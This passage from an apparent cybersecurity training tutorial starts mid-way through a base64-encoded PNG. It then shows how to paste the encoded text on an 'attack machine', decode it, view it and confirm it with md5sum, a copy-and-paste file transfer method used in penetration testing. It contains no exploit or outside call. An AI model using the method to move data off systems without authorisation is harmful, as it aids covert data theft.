JKwEksbafINkFXhWKCETFZmUe1hrpjxAUZDmpf3zKU75MFuyYAo4LVHyKgibx2eRnvYQ3fYTftIMRfO2EA6YeVXW5aiaAKfmLyDgYibHT01RLMmUFWGo3aOBcZRWZZl3vRDnDmnhR3Hanl1TyOBlB27MY0gqMiSQqE1TjBh5VebF1NknY1BzpBUZa6auoXlEw4gKBLIZuJqgt//ycWuvknMmj2P5qm1RKNx+voGkEQBQZZRPrShPnbzTNU0FJ3Wnspl93CYcDSqB7wsy7icLoq8RZSUlBBPxGlpOcIHWz/ggw8+aAsEAl8G3v9zQS3/FRDvDlVVvzQ8PPyAqqoLampqdFGdgoICvWbPi+Hngz/vPZUva8YiDGORoLFHWzabxWazYTabCYVCOJwuLv7Eueyr38e6jTtZfWuQ2y6ROW+FjDFjZG7lMWZWHmPN0cmsOd5IImvALChomkBGE0mkc1nr0ml7OHX6cTZuGmHuZW1sPxBmUo2Fm68+yE1neylye9neVsXGI+X0hx28tLeZ6RXdzBt3jJWTd9Id8vDQOxewf6CcTzVvYlbNEd45MIM3D0/ltAn7KSsYZsuxSXQECjlrwh7KHEFSGQupoiH6oy6ubt6Mx+MHVeTxjaehqRJXzVmHP2bnue0LqPP2c/6c94gGC3lj/0ymV7RR6g7y2KZltAcL8doiZFJmQhEXZ0/cyY6ecbx0oBlFE2gb8XLVzI18dv47/GrLUrrCbjZ3VdMV9HDlzI18dvHrdAyWsKl9Ai2DxbjMKc6YfJw5dZ3EU4O8/s4wK+4fZNv+MDWlFn5y9wjfuOw4+1preGVXIwMxBxZjBlFUkCWVlCIzErcwt2qAz89bk+t/NBOKKcu6bQrPbplAac00LrloBi6nncGBIZKpJEaT4SRjjbF7DGMToJLNks5mSKfSxKIxQpEw0UiERCKh94Eulwuv14fP5yWRSHC05Sjbt21n69atHYFA4Cbgrb8U0PJfOdvYrqrqTSMjIz9UFOWMuro6Ojo6UBSFoqIiXSE2r1OSN1XOoz45FxIBURBP7NSKAoIgnaTAIEoSqqKApuEpKCCVTBGNRmieMYO6ujp27dzJd184xM9fj/O1qyQWzTBhQuCMhv0srTvMls5atnTUkVQMNHgCLGxop9LXw6q1IRpuPU5L54nl6IPtCT7/rTY+/602fAVGrjzPy9UXeJk6wcWw38uW49W82TKVwYgdUVSQBJUCawyPPUoybUESVK5p3sS0quPs7qznhb2zKHMFmFrezbGgj3jcRqktxGXTttIVLEISNYZidlr9XmpcfqSsRDxhIZQ20R91kBwpRlVkltcfIJExYVTBY4nTHvASTllwmuP4o3Yiop0VE/fitsR5Yd8s9vZXIO+ex6Uz13PlrA08sWUJw3EbA1E733tvJQ5TmsmlgyxuaOeq+ds41h3mD6/4ue7FIdpGFRLySam9L8H5nz9IicfEt786yJfPbSUYKWXdoVpahgsxSFkW1bawoPooVlMS0mYyqszuVpXfrilFdjdy5rnN1NVWEwpF6OnpHVXOMIAmjJIeND0WEHIL4FlFQRtNlul0hkQiTjweIxyOEIlEdNTParWOTmGLKSwswu/3c+DAAbZs2cK2bdtaIpHIDX8pw/+tQQ+wX9O0G4PB4P0HDx68srGxkY6ODjKZDMXFxfoyeH7bKp1OY7fbTyp3ENG17pPJJIODg1itFpxON6IooeUbZEFAyWYxGHLCsIlEApPJxGnLl9PYOIkdO3fwtV8ep8SR5MuXyyyZbcIILChrZ9H446QzWV5Z5+eyz/eyfV+Evyg9JMBgIM2Dv+nhwd/0AFBXYeXSM4o4//RCpjU4kEQ7xwYL2d/j47m9p5BMyxTZQ5hlhVeOTGcwasdmyDCjsg2TJUZbWwN2cxKvb4BNLVOIpwxMLG/jeNc4AgkHk3x9GOQsCiIpVSKSNhHIyoRSVg73VXPOxN1IhiQlzhD0KWQzBoy2MMlAIc9tn0+Dr48F445yanUrq481sqO7il29V+A0ZqgrGuLMyS00lvqRxDCt7WFeXB3g/u8Mse9Y9CN/e57WoAkn3qOBQIrr7zrC9XcJTJlg40tXlnLbmV6sVgNaFJBF0hjY267w1LtFpI0NLFwymYaGCaiaRk93ny4Sll/YUTVVL3dVVWVwaBD/iB9PgQePx4M2uu8ajUaJRk9uWPPald4iLyWlJbjdbvr7+9m1ezebNm5k165d25LJ5KeBvX9NIMv8bVenpmmfi8fj3bt37/7ypEmT5LzPT0lJia48lTdXS6fT2Gw2bDab7k44MDBAZ2cngUAAo9FIaWkpkiTjdrtzQkmj9f/YssdiNufWEGMxirxFnH/++Uyf3s6unbv48s9bcT4R53MXGrl4hYwoSRhTMp84rYJx1W6+9cjxMXY+f4a8/qGrtTvO/b/q5LtPdCKKAhajxJTxNuY2O1k538XMyQ6cLhuJrIPhoJ0uv4u2YRcbjjfw6oHpKKqIUVJZdXgSsbSZem8fgT1zaBkqRtNU/HEb69sn0BdxklEkhuMONrXXY5QUNndWc3ioiFJ7mJ6wCwnY1FHDlq5qZFHDaU4Qy9g4OFxPQ3mQJVNXYzXESYRj7D0S5c0tAX77eJTdh6KE4zkHko+T9BzL89fGrkyN0clddoqHez9by/xmN3IWUBTSpixrtmo8834BRvcEFi2awuRJkxBFkYGhIdLJZA61E3L1uTAGuZNlmVgsRntbG0ajkYrKCrq7uzl48CDhcBiTyaSbakciEbLZ7OiU1YnP56OkpASL2czx48fZtn07mzZu5PDhw68oinLDx6E0f6+gh5zVxTcURTm2f//+H1VXVzskSSKTyVBaWorT6SSbzRKNRnWsPpVKEQgE6OzsxOFwUF1drStVud1uhoeHOXbsGCUlJZSXl+s4vq6cPAqBOkd9Q1OpFBUVlYwbV8ucuV1s376THz/fwveeinDeAiM3X2ykpEhl5ngrL/5oGoGswtvrh/npbzvYtCf0N/FVFEUjmsiyeW+IzXtDPPBkF6IgYDWL2CwixUUGJtdZaRpno67KSlm9mXKvBa/TjNFqRDIaUBUzaUXmLMlPMgmDAxrRqMA4d4Ba9wegahiMAkVemUXNu5AUBYOUQZIyqEqKdDzFSDhF/3CSzq44rQfjrG+Lc6A1Tu9gmlhSI55QxmD6wp8hk40VhNI+lrTWWGPnlqsrueDMYkqthhwF2pZhqDfL02/JrDvoo7RqPGed10zjpAmAwNDQ0AlxpVHBX1EQ9cm1JEnEEwn6+vuRRImKykra29rZtm0bZrOZ8rIyysrKaGlpoaurC5vNhizL2O12PB4PxcUllJaWoCgKe/ftY8uWLaxfv56+vr4fA/8B/E3GYf+VoAdIAL/UNG13e3v7AyMjI/NmzpwpSpJEIpHQHQmj0SipVAqLxYLdbqe5uRlVVenq6iIcDjNt2rTRTJ+r7fv7+zl48CBer5fCwsKTRDjHZiaz2axjusXFpXziE59g6ZIAe/ftZdP2fbzwxRHGl2lcscLA+UuMeNwal63wctmZZQyGUqzf4ufxP3Xz5oaR/9Ifr2oa0YRCNKEw4M+wtyUODJ/8xooCBhmMBgmjUcBsFNAEjZkNTr51az1zpzjQQikQRAS7RGdviju/1cL7O4KAQCqtkU5rpNMqaUX783LaH1Jy5i+IheSZo8KHgn3RLA+fPLeMs5YUUV5gyi0VmLKkogne3gKvbrIwmKiiacpEPnvzDMZV15BKZ+jv788FuyjoG2v6e6SqGEZFv4aHhggEg4z4/fT0dCMIou4VFYtFOXaslUgkoq//5V3lvV4vFRUVuN1uBgcH2bZtO+vXv8+2bdu6U6nUl4Hn/yv3778a9PlrG7AyEoncs2HDhs9OnjzZ0dDQgN/vx2az6Rr14XBYD/58Y1tUVITdbieRSGCz2QgGgxw5coR4LJYbOPh8eqYfKyirw52aisloRNMgnUphs9tZsmQpp556KsePH2fnzn386Pl2vv1UhOY6kQuWypw2K4uvSOSilV4uOquYRExh894Qr7w7yNubRjj0MSpg/9Urq2pk05BIZ3OMJmDOZCf33DqByZOcaOE0miajZkEMQVWxjW9+eSI33X2Ad/Lc/z/bhggfKku0v+H00qitsHD6qYWcv9THqc0unA4jiFkQVaLBOFv2qry51UjLgJeismrmLJvCjKlNuF0FBEMhWo+3kc6kkWWD7ug99ufnzbK7uroYHBzE7fFQXFpCeXkFEyZMoLOrk5YjLWzcuFF3ACwqKhqljuf4Mz5fMeXlZYDAwYOH2LhxA+vXr1fb2tre0DTtZqDrv3pv5L/D/Q0Dt2ez2dd27959X3d396KFCxdis9kYGRnB4XDogj2ZTEav0awWC6HRYUMikaCjo4N0Ok1tbS0Wi4X29nbS6TQWiwWv15sTgR0zCdb041NDGjWATqdSaIJAQ8NEJk1qIhQK0Xa8lf0Hj3D/053c9UiUCZUqZ86TWTJLZmKpyLK5LpYtLABBIDSYYdPuAGu2jrB+Z4jD7TFCkb+PmXFTrY3f/Wga9U1OGErlFsJFTqwjphXqqmy8+OgMVnxqO1v2Bflz9rEfdmf5S0Fvs0hMqLYyb5qb0+cXsqDZTWGxGQQVUhlIKhztiLF1v8C63QY6A158xZXMmjGBc6c2UVpSSjqTZcQ/TH//YX3/1CDnxJY0BH0VEXLyjgODA/T19CEbZFLJJLt37dJdvC1Wq+4K6PF49FPcaDTi8Xh0GyeXy0Vvby9btmxh7dq17N69u2d0wvo4/PecsGX+ftf7wFnDw8NfePHFF780c+ZM77Jly/Qyx2az6V5UqVSKiMGAzWbTXU48Hg/Nzc0UFRXplIdoNMrevXvZuXMnkyZNombcOAyynGt2x0qP5Ke8Uk6JII8gmUwmmmfMZO68UwkGg3R2tnP0WCuvbe/gkZf9GIQUcyfCGXMkpk2UKC0QOGuBh7OWFOZkGhSNgcEk63eH2LQryN4jEY53x/GHs4RjWf4WT+MDx2Occd02zl3ipXmKE2+hCYdVRgLCSZXBkRSHj0R49b0h9h//W06c3Itw2GTcDpmaMjNN42zMm+Fh0XQPNRVmchxmBTJZ0mmVzvYY+49qvL9bYHeHDdnqZUJdJfOX1/Gp8eMpKS5B1TSGhoY4duw4qprrryRR0h85XXkiL4WYzRIMBvEHAhhkmdKyUswmE5WVlVRUVnLkyBE2btyoqw07nU4kScJiseB253zOSkpKdSXizZs3s3btWjZu3JgeGBh4Afgq0PP3CNS/Z9ADxIH7ged37Nhx++HDh68+99xzLUuWLKGrq4tYLIbJZNKHWYFAAFmWKS8v1/dvM5mMLsh57NgxBgcHmTRpEuPHj8fvH2ZoKLfc4vV6TxKKPUlxYJR1KAgn5JtBo6GhkenTZ5BOp+nr7aWjo4229g5+9nofXb8KImsZJlUJLJwmcupkiaoyEZdD5MIlBVx8RhEYZZBFiCuMDKdp645zoDXGzkMRDrbGGPAnCccUIjGFVCZHRVZH0RNVg7beJD95uus/1YfPsTiE0UV1Ibe2Jws4rDJOm0SRx8jEcTaaGx1MrndSV2mmxGcEq5wL7oSCmlLJair+UIqefvjgsMqGfQKtAxZki4f62jKaJtew6II6qqqqsdvtJJNJBgYGOHz4CCoqoiDlVat0YpiO64sCIsIoUJGhtbWVcDhMQUEBgUiUY8eOEY1Gc9i6x4PdbmfChAlks9mcUoHRiMvtorDQi8/npaioKJccDhxg48aNrF27Vj127Ng2TdPuAVb/PYP07x30+esYcGMsFvv9M888c+d77723/MYbbxSXLFnCrl27dGfnvG1KKBRClmWi0Whem4T+/n4GBwcpLy/HbDbT09uD0+FkypQpDA0NsXPnTiRJora2Vj8m89jwiXpXGyW+5QZhqWSSRCIJaHgKPFRUVrJkqYFEMsHQ4BCdHe10dHax9sgAz24MEgzFEFCoKtKYXisxZbzExHESlV4Bp1NgxlQ7M6bZ+RTFuuY+kpTT6lRUyEAkniUcVwjFFaLJLLGESiKpkE6rKEpOu12SRYxGEZNJxGqSsJlFXDYZp0XGY5XAKIJpFAtR1BMCsoCmqShpjeBIhp6WFIc7FQ61ahzokOj2G0C24CtyU1NVysxFNVxWN46KyiqcTifpdJqRkRG6u7tJpVI6ZVySJURNHD3JhNH1SU2XaBcEgWAwSEtLC93d3RQXF1NfV0dBQcEo4TBnZx8Oh2lrayMSiejghs1mw+PxUFBQgNfnw+f1omkahw8f1k0/Nm/e3BuLxb4N/HoUNOH/haDPX2uBrQMDA2d961vf+lp1dfUpX/ziF5kwYQJ79+4lFArpmT+dTuvYfs7l0EVFRSVmc47SbDbmZgAbNmygra0Nn8/H5MmTiUajHDlyBJ/PR21tLfm5QQ7vF/QslWe65YAGEVVF10MUBAGP201JyVwWLlqMqqnEojGGhobo6enJrZwNDbPrvSCBP0WJp1OIWhazrFHggHKvQFWJSI1PpLRIoLBAwOUScVsEbEYod8qUSzIIRk7SFBE/Zl1VU3POB5kcYhNMZQgFNIJhjZGASp9fo2tAo2tApS8gEIoaSKkygmTCabdTUOihtKSI+SvKqKgop7y8IrdYMZpUQqEQvb29tLW15fTuBVGXsB47GxmryDzWdGPfvn10d3dTUVHB5MmTqaioYOfOnax68018Ph8+n4+RkRH6+/tzO9HFxYiiiNlsxuPxUFhYSHFxMUVFRSSTSbZs2YKqaQSDQZ577rlkS0vL91VVfRgY+u/W7v9TQQ+QEOBPmqa9097efsaXvvSlr9bW1s7+zGc+I6xYsYLDhw/T3d2NxZKzHk6n06RSKdLpNNFoRJ/mBoNB+vv7sVqtTJkyhUQiQSAQoKioiBkzZhCLxdi+bRuhcJjKykqqq6tH1a8yOa1zQfjzFpyaRjqTIZ3JEIlG9EAoLi6msrISk8mMKOaQpHg8TigYZNgfYHhoiOERP/5AgL29YTa1xEimMqTSabKZDJqmgJqjE4tiruWQREbFoFTdMEQYdQ3XRkWrcweADIiIooQ4KlyUW9+04nI68VS6qJtRRHFJMV6vl6KiQhx2O7Js0HunsebWeT8BfQlIFBE+BnnJ1+iyLJNKpRgcHCQej1NQUIDNZqOkpIRsNkt7ezvHjh2jtraW8fXjsVqt+r30+XyUlZXp5mY5roxXn+N0d3ezZs0aKioq8Hg8PProo/Ht27f/OJlMPgr0/qMD8p8R9PkrAvxR07TXWltbF91+++2fKSkpOfuKK64wnX322YTDYY4cOUI0GtWte1KpFLFYTBfuqaqqQtM0Ojo69KPY6XTS1tbGwYMHEUWR6TOmYzFb2LJlCxaLhalTpyBJMpIgII42wTqPWxQ+MqHUNA1VO2FQkYjHR9UTcqEpyzJ2h4OCwkKmTG7Svbby0N0JAl6aZDJFJpMmnUqTVbJks6r++7XRsXxeekGSZV1qJb+tZjIZsJhzdG2D0YjBICNJsv7acp5eOdVo/4ifwYHBE3/fmL8rH+i5k250R3hMwOclsTVNIzC6TJ23qwkEAoTDYY4dO0YkEsFoNOJyuamoqKC9vZ333nsPj8eDz+ejoaFB33d1OBwUFhZRXOyjqKiIRCJBy9EWkskk9XX1FBQU8OCDD3Zs2bLlAU3TfgeM/LMC8Z8Z9GMXVN4G3u7v75/ywAMPXP/oo49eccYZZ/guvfRSvF4vra2t9PX1Iss2BEHQb+5YeMtoNBKJRHjvvfcIBoNUVVXhdrvZv3c/giBQWFhAWVkZiUSSgwcPMjIyQn19PbW1tXqASkh65s8T3wRdyuOEAKw4hiGaVRSyipJbfh+rrDDKY8kHmCAKoyiUCYvF+rHL5XkE5MMO53k6djqdJZEIoChqTq5O1VDUk2m5+QdXFMSTvHPHPlD6Q6CqIEnIkoyGpj8ggUCI9vbjjIyMUF1dTWFhoe7CnTfHzmmSOgiFQnR1deou3DNnztT1Tu12O263m6KiIr2k6urqoqWlheLiYqqrqtm4cSM//MEP1x4/fvwnwCog9c8OwP+JoB977QO+mEwmv/nyyy9f8fLLL/9bbW3ttCuuuMKwcOFCUqkUx48fJxQK6SJA+QcgHo8jCAIFBQX4fD4MBgN9fX0MDQ2NKitXkEgkRqUEfYTDYbq6unA4nITDoZwVY0EhgiCQSCaQJEmXJB+73PJxm1+6w0U+kHS3lROLMSiQSWc+4l74scrK2gm3Ff13jJ4Ewhgj6PxIfyxen//8Sa4wo3W4MOZ1AaRSKfoHBohEIjicDnw+H2hgNhuprq4mFAqxbds2HA6HThbM26UCuhpGvnQxGAw4HA69MfV4cupi/f397N69Wz+ds9ksTz/9tP/VV1/9o6qqPwaO/E8G3f900OevAPAI8Mjx48dnfvvb374GuODUU0+tvPrqq4UlS5YwNDREZ2cnsdGJbb7+zzfAiUQCh8OBy+VC0zS2bt1KJpOhurpav2n9/f1omkbDhAlEYzH27duLKEpMmzYNn89HW1sbgUCACRMm4PP5yCrZHPV1zI6vKEq5rJpvjiXphGZmPmOPNs1jg3Bs4Isfu0apIgiirqgskA/4PBNSO2n4KggC0uh0Sxjzu/IPZXR06SIWi+klY1FREbHRxt9kMjFx4kRsNhuxWJxYLIrL9f+1d24/bWVXGP/5cmx8G19CwRg7BDAxhJvSXDSZKG3z0oc+pG+R8lCpf0b6F6D8AZVaRZWiqk9IVYWUREwViU7UoEwCCYEZESDg2AaMMT4YG+O7Tx/O2TtO+jDqQ6VJMlvaD+bBtsza+6z1rW99n5fjYx1utNvt+P1+HIbMnt1up7OzE5fLJW90v9+Px+BD5XI5Xrx4QavVIhqNEovFePjwYfn27dsLBwcHfwT+DjR+DMH2Ywn694ZWjH17fn7+1/Pz878Hvrx+/XrXrVu3zBcvXiSbzZJKpXTZiI4OaZgrCuBGo4HX68VsNlMoFCRFVdM0HA4Hu+k0b968wWq1Mj4+jsft1hsrqko6ncZsMpM/yvM2/pZWq0VfXx9Op5NCoaB3Dn1+HQbFhM1uw2a3YbXoKYBgFranGe/VC8aN/KHHqSaeIJqG2bA10lotMJvkIWnP16vVqqR36EX/saRvrK+vo6oqPzfmEHZ2dlhcXKRQKBCNRunp6WF1dZXt7W2pVJFIJNA0jZ6eHsbHx98b/RQy7V6vF5/Ph9PppFKpsL29zfLyMhaLhVgsxsTEBI8eParduXNnZ29v78/AX/6LlPRT0P8gqW3G2P65ublfzc3N/Q64ND4+Hrx586b16tWrtFot1tfXyWQyWCwWabsiCmHRD7Db7UaOX8ZsNuMy9DaFTo/Q3ezt7aVWr/Ht029xu91MTk7icjp1yrIhg1Kp6nVCs9HkwoULNJtNFhcXKZfLjI6O0t3dzf7+PoeHh7jdbtm67+7uxmqxkMlmOS4WURRFpi0iRdAJeduoag6vz0e1XEY1UKpwOCz1RDVNI51Ok0qlCIfDmEwmFhYWGBoaolQqkclkWFhYIBKJyOJYYOuhUAi3283h4SHFYpFQKMT58+flIRQEQRHkDodD58Dv7/P8+XOOj4+JRCLEYjGcTiczMzPNqampuKqqf9I0bRrY/n/BjZ960H+Y/vzDOADOlZWVCysrK79VFOU3nZ2dA9euXVNu3LjB2bNnyeVybGxskMvpYIDX65V5sKgHarWavLnEzSluPEAaU4immc71163W3W4Xe3t77Ozs4Pf7SSQTFAtF9jJ7Utvz8ePH5PN5JicnCQaDVKtVXr58yfLyMufOnaNSqRCPx+nt7SUUCrG2tsbS0hJjY+OUyyesra3R39+Pz+sFr5fDfJ6nT58SCASIRqN0dHTI+eRSqcTi4iKDg4OMjY1JtOuLL74glUqRTCbx+Xy4XC6i0ahua2MoUAwMDGC323E4HBJadLlc0oc1l8vJJ0QwGGRkZITLly/z5MkT7t6921xdXf26XC7/rdVqfW1wsBofQzB9LEEvGavAMfAN8E29Xv9DOp3um56e/nJ6evqGy+X6KhwOd125csVy7RfXGBwcpFatkUgk2N3dlYQ3n88nocZGo0m9XpOEuGazicPh4MyZMzSbTSwWi7RcPzk5IZPJsLu7S7FYlJDe9vY2qqrKIm53d5fj42OSyaS0IUomk5TLZXlrqqrKyckJGxsbFAoFQqEQukx6jmw2KyeI3G436XSa/f19+f0VRZGjmcJhL5VKSV9Vi8VCIBCgu7tbl602tu4oYzcGe9zyvSqVCkdHul5MJpPBarUSiUQ4ffo0TqeTV69eMTMzw9TU1HI2m51utVr/BFaN/8VHt6x83KsKrBv7r6VSybG2tjawtrb21b17936pKMqVcDgcjsVitkuXLjE6OorP55O3mB5cRUCHQZ1OJ4qiSH7/h0Pv7SzR9jpCTPWIg6EbzLlkYFcqFVkItge8QJ8AEokEBwcHdHZ20t/fT7FY5PDwUFKyR0dHpcJEq9WSpDy/3y8beAJvt9lsksYtNB41TZOGBrmcytZWnGq1it1uJxAIEAgEpFrY0tISs7Oztc3Nzeeqqv4LfdB6BX2A6KNfVj6tVQa+N/bder1ujsfjvfF4fGx2dvYKMGG1Wif6+vqCw8PDjuHhYQYHByWz8+TkBFVVOTo6olKpSC6PSAE8Ho98QrTDmULJTVCfRcHZDkm2y6WcOnUKRVEAjXpdzwhGRkbeyaVoYLFaDHzcjNmso0aKYpWHUhgKm0zvMx11qxndA6xUKsn+hoAXRZ5us9nY398nHo9z//798tbW1nfZbPZ7gzryzOBP1fkEl5VPe7XQhw1SRiOERqPB5ubmzzY3N2MPHjy4ApwDBiwWy2BfX1/n0NCQ0t/fbxZ8b1G8CtNoMQ0mFCDkD2mowLWrwYlGmjgkiqLoHVGJ2Qs8/R1mLwahxWeK71yvVzk5KUmItv0Qic8XTTtxu9tsNiqVCgcHB2xsbBCPx0uvX79O5vP5JPCdkSa+ApJ8RsvK57myxv63+EOz2WRrayuwtbV1BhgFJoDTQBfQ6fF4Tvn9fncwGLRHIhFrV1eXye/3mzwej8SyxW3b7sErDKYF1t8ujNWuNW8xv5NDEWiLOCjitZCxE24wIhc3CF7NnZ2dUi6XK+TzebVareaABPACXSXgNW3KvfBD4yc/Bf3nslRjv/gwMIrFIsXjojuZTHY9e/asB4gAZ4AoEAQ6AA/gAKwmk6lDURRrR0dHh6IoZpvNZlYUxaYoisVsNmvtDSo0aLaaWqPRaDUajVqtVmvV63WtVqvVKpVKvdlsVo1Uo2zsHSP9SABvDYgwzf84IP25rv8AEEWbpbyRt8wAAAAASUVORK5CYII=
```
- on the attack machine, open a text editor, paste and save the previously copied base64 output:
```
$ nano b64image.png

 <paste the above output>
 <save & exit>
```
- Next, use the base64 command with the -d switch to decode the newly created file and direct that output to a new file called logoCyber.png
```
$ base64 -d b64image.png > logoCyber.png
```
- Finally, open the file in an image editor to view contents
```
$ gimp logoCyber.png
```
Figure 1: Final Image

![image](https://github.com/ruppertaj/WOBC/assets/93789685/c25f2e9a-4d74-4336-a53d-8b20b151a9b6)

- For additional verification and to ensure all data was properly copied, md5sum both image files and confirm that they match
```
$ md5sum logoCyber.png
92149db2a66103073e9186df05195b9f  logoCyber.png
```

References:  
https://infinitelogins.com/2020/04/24/transferring-files-via-base64/  
https://linux.die.net/man/1/xxd  
https://linux.die.net/man/1/base64  
